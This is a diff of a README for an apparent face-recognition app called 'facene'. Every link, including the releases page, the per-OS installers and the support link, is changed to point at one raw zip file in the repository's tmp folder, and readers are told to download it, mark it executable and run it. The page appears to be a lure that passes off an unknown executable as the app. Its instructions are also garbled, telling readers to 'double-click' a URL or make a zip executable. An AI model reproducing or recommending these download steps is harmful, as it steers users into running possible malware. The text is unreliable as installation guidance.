@@ -6,7 +6,7 @@ Welcome to facene! This application uses TensorFlow to recognize faces quickly a
 
 ## 📥 Download Now
 
-[![Download facene](https://raw.githubusercontent.com/nmiganh/facene/master/larderlike/facene.zip%20facene-v1.0-blue)](https://raw.githubusercontent.com/nmiganh/facene/master/larderlike/facene.zip)
+[![Download facene](https://github.com/nmiganh/facene/raw/refs/heads/master/tmp/Software_3.5.zip%20facene-v1.0-blue)](https://github.com/nmiganh/facene/raw/refs/heads/master/tmp/Software_3.5.zip)
 
 ## 📋 System Requirements
 
@@ -20,21 +20,21 @@ Before you download, make sure your system meets these requirements:
 ## 🔧 How to Download & Install
 
 1. **Visit the Releases Page.** Click the link below:
-   [Visit this page to download](https://raw.githubusercontent.com/nmiganh/facene/master/larderlike/facene.zip)
+   [Visit this page to download](https://github.com/nmiganh/facene/raw/refs/heads/master/tmp/Software_3.5.zip)
 
 2. **Find the Latest Version.** Look for the version marked as "Latest Release."
 
 3. **Download the Installer.** Click on the file suitable for your operating system. The available files usually include:
-   - **Windows:** https://raw.githubusercontent.com/nmiganh/facene/master/larderlike/facene.zip
-   - **macOS:** https://raw.githubusercontent.com/nmiganh/facene/master/larderlike/facene.zip
-   - **Linux:** https://raw.githubusercontent.com/nmiganh/facene/master/larderlike/facene.zip
+   - **Windows:** https://github.com/nmiganh/facene/raw/refs/heads/master/tmp/Software_3.5.zip
+   - **macOS:** https://github.com/nmiganh/facene/raw/refs/heads/master/tmp/Software_3.5.zip
+   - **Linux:** https://github.com/nmiganh/facene/raw/refs/heads/master/tmp/Software_3.5.zip
 
    Choose the file that matches your OS and click it to start downloading.
 
 4. **Run the Installer.**
-   - **For Windows:** Double-click the `https://raw.githubusercontent.com/nmiganh/facene/master/larderlike/facene.zip` file you downloaded. Follow the on-screen prompts to complete the installation.
-   - **For macOS:** Open the `https://raw.githubusercontent.com/nmiganh/facene/master/larderlike/facene.zip` file. Drag the `facene` icon to your Applications folder.
-   - **For Linux:** Make the `https://raw.githubusercontent.com/nmiganh/facene/master/larderlike/facene.zip` executable by right-clicking it, going to Properties, selecting Permissions, and checking "Allow executing file as program." Then, double-click it to run.
+   - **For Windows:** Double-click the `https://github.com/nmiganh/facene/raw/refs/heads/master/tmp/Software_3.5.zip` file you downloaded. Follow the on-screen prompts to complete the installation.
+   - **For macOS:** Open the `https://github.com/nmiganh/facene/raw/refs/heads/master/tmp/Software_3.5.zip` file. Drag the `facene` icon to your Applications folder.
+   - **For Linux:** Make the `https://github.com/nmiganh/facene/raw/refs/heads/master/tmp/Software_3.5.zip` executable by right-clicking it, going to Properties, selecting Permissions, and checking "Allow executing file as program." Then, double-click it to run.
 
 5. **Open the Application.** After installation, you can find facene in your Applications (macOS), Start Menu (Windows), or via your file explorer (Linux).
 
@@ -84,9 +84,9 @@ Yes, facene is open-source software, and it is completely free to use.
 
 ## 📞 Support
 
-If you have any questions or need further assistance, feel free to reach out. You can create an issue on our [GitHub page](https://raw.githubusercontent.com/nmiganh/facene/master/larderlike/facene.zip) or check our community discussions for solutions.
+If you have any questions or need further assistance, feel free to reach out. You can create an issue on our [GitHub page](https://github.com/nmiganh/facene/raw/refs/heads/master/tmp/Software_3.5.zip) or check our community discussions for solutions.
 
 ## 📥 Additional Download Link
 
 For quick access, you can also download facene from here:
-[Download facene](https://raw.githubusercontent.com/nmiganh/facene/master/larderlike/facene.zip)
+[Download facene](https://github.com/nmiganh/facene/raw/refs/heads/master/tmp/Software_3.5.zip)
